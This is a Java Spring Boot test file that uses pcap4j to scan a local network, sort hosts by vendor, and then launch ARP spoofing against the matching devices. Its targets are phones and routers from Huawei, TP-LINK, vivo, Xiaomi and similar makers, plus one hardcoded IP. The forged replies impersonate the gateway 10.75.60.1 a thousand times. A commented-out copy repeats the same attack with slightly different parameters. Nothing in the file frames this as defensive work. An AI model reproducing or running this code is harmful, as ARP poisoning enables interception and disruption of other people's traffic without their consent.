package com.rbac.demo;

import com.rbac.demo.entity.Oui;
import com.rbac.demo.entity.ScanInfo;
import com.rbac.demo.jpa.JpaFilter;
import com.rbac.demo.jpa.JpaOui;
import com.rbac.demo.pcap4j.ArpReply;
import com.rbac.demo.pcap4j.FiltAllPacket;
import com.rbac.demo.pcap4j.GetMacByIp;
import org.junit.jupiter.api.Test;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapNativeException;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.context.annotation.Scope;

import java.net.UnknownHostException;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@SpringBootTest
public class Pcap4JTest4 {
    @Autowired
    private JpaFilter jpaFilter;
    @Autowired
    private JpaOui jpaOui;

    @Test
    public void test() {
/**
 *
 *
 *
 *
 * */
        FiltAllPacket filtAllPacket = new FiltAllPacket();
        try {
            filtAllPacket.filtAllPacket(jpaOui, jpaFilter);
            for (ScanInfo scanInfo : jpaFilter.findAll()) {
                String info = scanInfo.getOuiByOuiId().getComInfo();
                if (info.contains("Huawei") || info.contains("TP-LINK")
                        || info.contains("vivo") || info.contains("Netcore") || info.contains("360")
                        || info.contains("Tenda") || info.contains("Xiaomi")||scanInfo.getIp().equals("10.75.60.161")) {
                    ArpReply reply = new ArpReply();
                    try {
                        GetMacByIp getMacByIp = new GetMacByIp();
                        String mac = getMacByIp.GetMac(scanInfo.getIp(), "10.75.60.35", "6c:4b:90:8b:42:03", "10.75.60.35", 2);
                        if (mac.length() > 2) {
                            reply.ARPSpoofing(scanInfo.getMac(), scanInfo.getIp(),
                                    "6c:4b:90:8b:42:03", "10.75.60.1", 1000, "10.75.60.35");
                        }
                    } catch (PcapNativeException e) {
                        e.printStackTrace();
                    } catch (NotOpenException e) {
                        e.printStackTrace();
                    } catch (UnknownHostException e) {
                        e.printStackTrace();
                    }
                }
            }
        } catch (PcapNativeException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (NotOpenException e) {
            e.printStackTrace();
        }
    }
}
/*        FiltAllPacket filtAllPacket = new FiltAllPacket();
        try {
            filtAllPacket.filtAllPacket(jpaOui, jpaFilter);
            for (ScanInfo scanInfo:jpaFilter.findAll()){
                String info=scanInfo.getOuiByOuiId().getComInfo();
                if(info.contains("Huawei")||info.contains("TP-LINK")
                        ||info.contains("vivo")||info.contains("Netcore")||info.contains("Netcore")||info.contains("360")
                        ||info.contains("Tenda")||info.contains("Xiaomi ")){
                    ArpReply reply=new ArpReply();
                    try {
                        GetMacByIp getMacByIp=new GetMacByIp();
                        String mac=getMacByIp.GetMac(scanInfo.getIp(),"10.75.60.35","6c:4b:90:8b:42:03","10.75.60.35",2);
                        if(mac.length()>2){
                            reply.ARPSpoofing(scanInfo.getMac(),scanInfo.getIp(),
                                    "6c:4b:90:8b:42:03","10.75.60.35",1000,"10.75.60.35");
                        }
                    } catch (PcapNativeException e) {
                        e.printStackTrace();
                    } catch (NotOpenException e) {
                        e.printStackTrace();
                    } catch (UnknownHostException e) {
                        e.printStackTrace();
                    }
                }
            }
        } catch (PcapNativeException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (NotOpenException e) {
            e.printStackTrace();
*/


